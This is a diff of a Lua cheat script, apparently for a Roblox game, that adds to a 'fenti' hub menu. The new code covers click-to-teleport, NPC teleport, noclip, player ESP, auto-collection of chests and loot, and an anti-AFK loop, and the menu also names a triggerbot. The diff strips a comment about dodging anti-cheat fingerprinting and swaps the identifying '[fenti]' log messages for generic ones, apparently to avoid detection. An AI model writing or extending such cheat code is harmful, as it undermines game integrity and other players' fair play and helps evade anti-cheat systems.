+            local sel = Options.QuickTPLocation and Options.QuickTPLocation.Value
+            if type(sel) ~= "string" or sel == "" then Library:Notify("Pick a place from the list.", 3); return end
+            local map = rawget(_G, "fentiQuickTPLookup")
+            local getCF = map and map[sel]
+            if type(getCF) == "function" then
+                local cf = getCF()
+                if typeof(cf) == "CFrame" then smartTeleport(cf); Library:Notify("Done.", 2); return end
+            end
+            Library:Notify("Could not resolve that place (missing or unloaded).", 4)
+        end,
+    })
+    TPLocations:AddButton({
+        Text = "Refresh place list",
+        Func = function()
+            pcall(function()
+                if Options.QuickTPLocation then Options.QuickTPLocation:SetValues(fentiRefreshQuickTPValues()) end
+            end)
+            Library:Notify("Place list refreshed.", 2)
+        end,
+    })
+    TPLocations:AddDivider()
+    do
+        _G.fentiDisconnectClickTP = function()
+            if _G.fentiClickTPInputConn then
+                pcall(function() _G.fentiClickTPInputConn:Disconnect() end)
+                _G.fentiClickTPInputConn = nil
+            end
+        end
+        TPLocations:AddToggle("FentiClickTP", {
+            Text = "Click TP",
+            Default = false,
+            Callback = function(v)
+                pcall(function() _G.fentiDisconnectClickTP() end)
+                if not v then
+                    Library:Notify("Click TP off", 2)
+                    return
+                end
+                _G.fentiClickTPInputConn = UIS.InputBegan:Connect(function(input, gameProcessed)
+                    if gameProcessed then return end
+                    if not Toggles.FentiClickTP or not Toggles.FentiClickTP.Value then return end
+                    local cam = workspace.CurrentCamera
+                    if not cam then return end
+                    refreshCharacter()
+                    if not humanoidRootPart then return end
+                    local ray
+                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                        local m = UIS:GetMouseLocation()
+                        ray = cam:ScreenPointToRay(m.X, m.Y)
+                    elseif input.UserInputType == Enum.UserInputType.Touch then
+                        ray = cam:ScreenPointToRay(input.Position.X, input.Position.Y)
+                    else
+                        return
+                    end
+                    local params = RaycastParams.new()
+                    params.FilterType = Enum.RaycastFilterType.Exclude
+                    params.FilterDescendantsInstances = { character }
+                    local hit = workspace:Raycast(ray.Origin, ray.Direction * 900, params)
+                    if hit then
+                        smartTeleport(CFrame.new(hit.Position + Vector3.new(0, 2.5, 0)))
+                        Library:Notify("Click TP", 1.5)
+                    end
+                end)
+                Library:Notify("Click TP on — click/tap the world to teleport", 3)
+            end,
+        })
+    end
+    TPLocations:AddDivider()
     end end -- Teleport
     
     -- [FENTI-22d] NPCs
     if Tabs.NPCs then do
     local NPCActions = Tabs.NPCs:AddLeftGroupbox("NPC actions", "user")
     
-    local npcList = getNPCList()
+    local npcList = _G.fentiGetNPCList()
     NPCActions:AddDropdown("SelectedNPC", { Text = "NPC", Values = npcList, Default = nil, AllowNull = true, Searchable = true })
     NPCActions:AddButton({ Text = "Teleport to NPC", Func = function()
         local sel = Options.SelectedNPC.Value
-        if sel and sel ~= "" then teleportToNPC(sel) else Library:Notify("Select an NPC.", 3) end
+        if sel and sel ~= "" then _G.fentiTeleportToNPC(sel) else Library:Notify("Select an NPC.", 3) end
     end })
     NPCActions:AddButton({ Text = "Talk to NPC", Func = function()
         local sel = Options.SelectedNPC.Value
@@ -7086,7 +8582,7 @@ do
         if sel and sel ~= "" then _G.fentiDialogue.instaDialogNPC(sel) else Library:Notify("Select an NPC.", 3) end
     end })
     NPCActions:AddButton({ Text = "Refresh NPC list", Func = function()
-        local nl = getNPCList(); Options.SelectedNPC:SetValues(nl); Library:Notify(#nl .. " NPCs.", 3)
+        local nl = _G.fentiGetNPCList(); Options.SelectedNPC:SetValues(nl); Library:Notify(#nl .. " NPCs.", 3)
     end })
     NPCActions:AddDivider()
     NPCActions:AddButton({ Text = "Open bank (Banker)", Func = _G.fentiOpenBank })
@@ -7122,6 +8618,11 @@ do
     
     -- [FENTI-22e] Config (menu, theme, save, unload — keep last in sidebar)
     if Tabs.Config then do
+    local PerfGroup = Tabs.Config:AddRightGroupbox("Performance", "zap")
+    PerfGroup:AddButton({ Text = "Optimize for overnight AFK", Func = function()
+        pcall(fentiApplyAfkOptimize)
+        Library:Notify("AFK mode: lighting, quality, post-FX, terrain water, particles/beams muted.", 5)
+    end })
     local MenuGroup = Tabs.Config:AddLeftGroupbox("Menu", "wrench")
     MenuGroup:AddToggle("KeybindMenuOpen", { Default = Library.KeybindFrame.Visible, Text = "Open keybind menu", Callback = function(val) Library.KeybindFrame.Visible = val end })
     MenuGroup:AddToggle("ShowCustomCursor", { Text = "Custom cursor", Default = false, Callback = function(val) Library.ShowCustomCursor = val end })
@@ -7140,9 +8641,12 @@ do
     MenuGroup:AddButton("Unload script", function()
         failLogWrite("=== UNLOAD " .. os.date() .. " ===")
         isRunning = false
+        rawset(_G, "fentiFishingReturnCFrame", nil)
         _G.fentiFishingNoSnap = nil
-        chestFarmEnabled = false; espEnabled = false
-        corpseFarmEnabled = false; noStunEnabled = false; autoSellFish = false
+        espEnabled = false
+        pcall(function() fentiSetNoclip(false) end)
+        pcall(function() _G.fentiDisconnectIYLootInstantPP() end)
+        corpseFarmEnabled = false; noStunEnabled = false; autoSellFish = false; autoSellWood = false
         killstreakTrackerEnabled = false; antiRagdollEnabled = false
         fentiStopKillstreakTracker(); fentiStopAntiRagdoll()
         triggerbotEnabled = false; noScreenShake = false; saintsEnabled = false
@@ -7155,6 +8659,7 @@ do
         stopTPLoop(); unlockRootMotion()
         if _G.fentiStopFishingPoseHold then pcall(_G.fentiStopFishingPoseHold) end
         pcall(function() _G.fentiDisconnectIYChestInstantPP() end)
+        pcall(function() if _G.fentiDisconnectClickTP then _G.fentiDisconnectClickTP() end end)
         _G.fentiRadiusPromptStop = true
         pcall(function()
             if _G.fentiSelfAuraCharConn then
@@ -7194,6 +8699,16 @@ do
                 "InstantPromptWorld",
                 "AutoDialogue",
                 "AutoDialogueKeybind",
+                "FentiNoclip",
+                "PlayerESPHighlightFill",
+                "PlayerESPHighlightAlpha",
+                "AutoFishLoot",
+                "AutoCollectChests",
+                "InstantPromptChest",
+                "InstantPromptSaints",
+                "InstantPromptCorpse",
+                "FentiUnifiedChests",
+                "FentiUnifiedLootPrompts",
             })
             ThemeManager:SetFolder("fenti"); SaveManager:SetFolder("fenti/config")
             -- Obsidian ThemeManager: when no themes/default.txt, LoadDefault uses this (must be before ApplyToTab).
@@ -7264,7 +8779,7 @@ do
     
     end)
     if not _fentiHubUiOk then
-        warn("[fenti] Hub UI build failed: " .. tostring(_fentiHubUiErr))
+        warn("hub failed")
         if _G.fentiObsidianLoader then
             pcall(function()
                 local EL = _G.fentiObsidianLoader
@@ -7287,21 +8802,24 @@ do
         return
     end
     end
-    end)()
-    
-    -- ----------------------------------------------------------------------------
-    -- [FENTI-23] 23. STARTUP (after UI — keeps main chunk locals down)
-    -- ----------------------------------------------------------------------------
+    -- [FENTI-23] Startup while hub locals still in scope (Library / Toggles / antiAFKLoop).
     task.defer(function()
+        task.wait(0.12)
+        pcall(function()
+            local T = Library and Library.Toggles
+            if not T then return end
+            if not (T.FentiUnifiedLootPrompts and T.FentiUnifiedLootPrompts.Value) then
+                pcall(function() _G.fentiDisconnectIYLootInstantPP() end)
+            end
+            if not (T.FentiUnifiedChests and T.FentiUnifiedChests.Value) then
+                pcall(function() _G.fentiDisconnectIYChestInstantPP() end)
+            end
+        end)
         task.spawn(antiAFKLoop)
     end)
-    -- Do not auto-start corpse RS/workspace listeners: "Everything" preset enables Teleport; games that
-    -- use remote/logservice spoofchecks often fingerprint extra DescendantAdded on ReplicatedStorage.
-    -- Turn on "Detect Corpse Spawns" in Teleport → Corpse when you want it.
     if LoadModules.Teleport and rawget(_G, "FENTI_AUTO_CORPSE_LISTENER") == true then
         _G.FentiFarm.startCorpseListener()
     end
-    
     do
     (function()
         if UIS.TouchEnabled and not UIS.KeyboardEnabled then Library:SetDPIScale(75); Library:Notify("Mobile detected.", 3)
@@ -7310,7 +8828,7 @@ do
             Library:Notify("Press " .. kbText .. " to toggle UI.", 5)
         end
         Library:Notify("Use the sidebar to open tabs.", 3)
-        warn("[fenti] Ready - toggle the menu with your keybind.")
+        warn("ready")
     end)()
     end
-    
+    end)()
